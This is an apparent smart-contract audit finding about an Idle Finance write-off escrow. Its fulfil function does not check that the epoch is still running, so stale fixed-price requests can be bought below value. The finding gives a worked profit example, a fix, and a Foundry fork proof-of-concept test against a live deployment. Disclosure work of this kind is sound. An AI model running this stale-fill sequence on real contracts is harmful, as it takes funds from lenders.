### Title
Stale write-off requests remain executable after the epoch in which they were authorized - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` only permits lenders to escrow tranche tokens while an epoch is running, but `fullfillWriteOffRequest` never verifies that the same epoch is still running. A stale request can therefore be filled after epoch-end accounting changes the tranche value, allowing an unprivileged fulfiller to buy the escrowed tranches at an outdated fixed price.

### Finding Description
A lender deposits tranche tokens into the escrow and specifies a fixed amount of underlying requested during a running epoch in `createWriteOffRequest` [1](#0-0) . The request remains in `userRequests` until explicitly deleted or fulfilled.

`fullfillWriteOffRequest` only checks that the supplied tranche amount exactly equals the stored request and that the supplied underlying amount is not below the stored ask [2](#0-1) . It does not check `isEpochRunning()`, the request creation epoch, a deadline, or the current tranche price. After checking the stale request, it transfers underlying to the lender and transfers the escrowed tranche tokens to the caller [3](#0-2) .

The expected lifecycle is tied to a running epoch: creation requires `IdleCDOEpochVariant.isEpochRunning()` [4](#0-3) , and borrower write-off through `writeOffDeposit` also requires `isEpochRunning` [5](#0-4) . Nevertheless, the escrowed order survives epoch transitions and remains fillable indefinitely.

### Impact Explanation
An attacker can wait for an epoch transition or yield accrual to make an old fixed-price request favorable, then call `fullfillWriteOffRequest` and receive tranche tokens worth more than the underlying paid.

For example:

1. While epoch `N` is running, a lender escrows `100e18` AA tranche tokens and requests `90e6` USDC.
2. The epoch stops and borrower interest is accounted for, increasing the tranche value to `100e6` USDC.
3. During the buffer, the attacker calls `fullfillWriteOffRequest(lender, 100e18, 90e6)`.
4. With the default `0.1%` exit fee, the lender receives `89.91e6` USDC and the attacker receives tranches worth `100e6` USDC.

The attacker captures approximately `10.09e6` USDC of stale-order value, subject to market liquidity and the actual tranche-price increase. The lender did consent to the original fixed ask, but only in the context of a running-epoch write-off request; the code does not expire or revalidate that consent after the epoch ends.

### Likelihood Explanation
Likelihood depends on a lender leaving a request unfilled and uncancelled through an epoch transition, followed by a sufficiently favorable tranche-price movement. No privileged misconduct is required: any EOA or contract can fulfill the request, and the relevant attacker role is explicitly a write-off fulfiller.

The attacker can monitor `userRequests` and only fulfill requests whose fixed ask is below the current tranche value. Existing checks do not prevent this: `fullfillWriteOffRequest` verifies only the request fields and token transfers, not request freshness.

### Recommendation
Bind fulfillment to the same validity window as request creation. At minimum, `fullfillWriteOffRequest` should revert unless `IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()` is true.

A stronger design is to record the request epoch or an explicit expiry timestamp when the request is created and reject fulfillment after that boundary:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol
struct WriteOffRequest {
    uint256 tranches;
    uint256 underlyings;
    uint256 validUntil; // or requestEpoch
}
```

Then require `block.timestamp <= request.validUntil`, or require the current vault epoch to match `requestEpoch`, before clearing the request and transferring assets.

### Proof of Concept
The following Foundry fork test demonstrates the stale-fill sequence. Point the addresses at an active `IdleCDOEpochVariant` deployment and its configured escrow, tranche, manager, underlying, and a lender holding tranche tokens.

```solidity
// test/foundry/WriteOffEscrowStaleRequest.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IIdleCDOEpochVariant {
    function AATranche() external view returns (address);
    function isEpochRunning() external view returns (bool);
    function epochEndDate() external view returns (uint256);
    function stopEpoch(uint256 newApr, uint256 interest) external;
    function token() external view returns (address);
}

interface IWriteOffEscrow {
    function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external;
    function fullfillWriteOffRequest(address user, uint256 tranches, uint256 underlyings) external;
}

contract WriteOffEscrowStaleRequestTest is Test {
    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(vm.envAddress("CDO"));
    IWriteOffEscrow escrow = IWriteOffEscrow(vm.envAddress("WRITE_OFF_ESCROW"));

    address manager = vm.envAddress("CDO_MANAGER");
    address lender = vm.envAddress("TRANCHE_LENDER");
    address attacker = makeAddr("staleRequestFulfiller");

    function testStaleWriteOffRequestCanBeFilledAfterEpoch() public {
        IERC20 tranche = IERC20(cdo.AATranche());
        IERC20 underlying = IERC20(cdo.token());

        require(cdo.isEpochRunning(), "fixture must begin during a running epoch");

        uint256 tranches = tranche.balanceOf(lender);
        uint256 staleAsk = 90e6;

        vm.startPrank(lender);
        tranche.approve(address(escrow), tranches);
        escrow.createWriteOffRequest(tranches, staleAsk);
        vm.stopPrank();

        // Honest epoch transition. This changes tranche value while leaving the request stored.
        vm.warp(cdo.epochEndDate());
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        assertFalse(cdo.isEpochRunning(), "request should now be stale");

        deal(address(underlying), attacker, staleAsk);
        vm.startPrank(attacker);
        underlying.approve(address(escrow), staleAsk);

        uint256 trancheBalanceBefore = tranche.balanceOf(attacker);
        escrow.fullfillWriteOffRequest(lender, tranches, staleAsk);
        vm.stopPrank();

        assertEq(
            tranche.balanceOf(attacker) - trancheBalanceBefore,
            tranches,
            "stale request transferred escrowed tranches after epoch end"
        );
    }
}
```

A regression test should additionally assert that `fullfillWriteOffRequest` reverts once `isEpochRunning()` is false.

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];
```
